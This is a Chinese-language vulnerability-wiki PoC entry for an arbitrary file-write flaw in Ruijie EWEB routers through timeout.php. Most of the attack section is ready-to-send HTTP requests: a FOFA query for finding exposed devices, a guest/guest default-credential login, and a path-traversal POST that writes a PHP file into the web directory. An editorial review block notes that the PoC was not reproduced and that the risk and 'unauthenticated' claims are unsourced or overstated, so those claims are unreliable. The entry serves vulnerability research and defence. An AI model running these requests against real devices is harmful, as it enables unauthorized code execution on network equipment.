---
source: "SourByte05/Vulnerability-Wiki-PoC"
id: "vw-fdbace52c1a7e8ff13cd1807"
entity_id: "ve-fdbace52c1a7e8ff13cd1807"
schema_version: "1"
fofa_unverified: "title="
title: "锐捷EWEB路由器-timeout.php任意文件上传漏洞"
product: "Ruijie EWEB路由器"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "先guest/guest?获取RUIJIEID；PHP执行需目标目录解析"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/IOT%E5%AE%89%E5%85%A8/Ruijie/%E9%94%90%E6%8D%B7EWEB%E8%B7%AF%E7%94%B1%E5%99%A8-timeout.php%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "文中写入/上传步骤会创建或覆盖目标文件；须先核对服务账户写权限、保存路径和脚本解析条件，验证后按原路径核查残留"
source_status: "unknown"
---

#  锐捷EWEB路由器-timeout.php任意文件上传漏洞

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：Ruijie EWEB路由器
- 本文讨论：timeout.php upload fileName/mes写入
- 版本、权限与配置前提：先guest/guest?获取RUIJIEID；PHP执行需目标目录解析
- 资料类型：文件写入PoC；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 简介未授权但示例先登录guest，需区分默认弱口令或登录绕过与独立免认证
- 在野利用已知/影响广等风险表没有出处
- 所谓上传是表单content写入，Cookie误含path/HttpOnly；固定长度/重复Connection
- 与timeout getFile不同动作，不能合并成一漏洞
- 已落实的文本修订：HTTP 报文围栏改为 http；残缺指纹退出可执行索引并保留原值。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 文中写入/上传步骤会创建或覆盖目标文件；须先核对服务账户写权限、保存路径和脚本解析条件，验证后按原路径核查残留

### 待核与来源

- 真实固件范围/修复、PHP回显截图待核
- 引用图片未查看，截图内容及有效性待核验
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


# 漏洞描述

锐捷EWEB路由器-timeout.php任意文件上传漏洞，未授权的攻击者可上传恶意文件导致服务器被控制。

# 影响版本

锐捷EWEB路由器

# **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | 已公开 | 已公开 | 已知 |

## 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

# 漏洞复现

FOFA：title="锐捷网络-EWEB网管系统"

POC/EXP：获取cookie

```http
POST /ddi/server/login.php HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0
Content-Length: 30
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive

username=guest&password=guest?

```

![image-20250324214655981](./.resource/锐捷EWEB路由器-timeout.php任意文件上传漏洞/media/image-20250324214655981.png)


POC/EXP：上传文件、

```http
POST /system_pi/timeout.php?a=upload HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
Content-Length: 62
Accept: */*
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Cookie: RUIJIEID=f7ma4hjcmm0ncqv7ljbejboqj4; path=/; HttpOnly; 
X-Requested-With: XMLHttpRequest
Connection: keep-alive

fileName=../tmp/html/112233.php&mes=<?php echo 3,1415926;?>
```

![image-20250324214746281](./.resource/锐捷EWEB路由器-timeout.php任意文件上传漏洞/media/image-20250324214746281.png)


![image-20250324214806127](./.resource/锐捷EWEB路由器-timeout.php任意文件上传漏洞/media/image-20250324214806127.png)


# 漏洞修复

关闭互联网暴露面或接口设置访问权限

升级至安全版本


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
